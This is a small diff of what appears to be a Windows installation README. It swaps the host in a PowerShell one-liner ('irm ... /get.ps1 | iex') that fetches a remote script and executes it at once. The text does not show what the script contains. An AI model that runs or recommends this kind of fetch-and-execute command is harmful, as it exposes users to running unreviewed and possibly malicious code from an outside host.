@@ -13,7 +13,7 @@ Only For Windows 10/11
 -   Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
 -   Copy and paste the code below and press enter  
 ```
-irm orange.run.place/get.ps1 | iex
+irm oranges.lt/get.ps1 | iex
 ``` 
 
 ### Method 2 - Download File
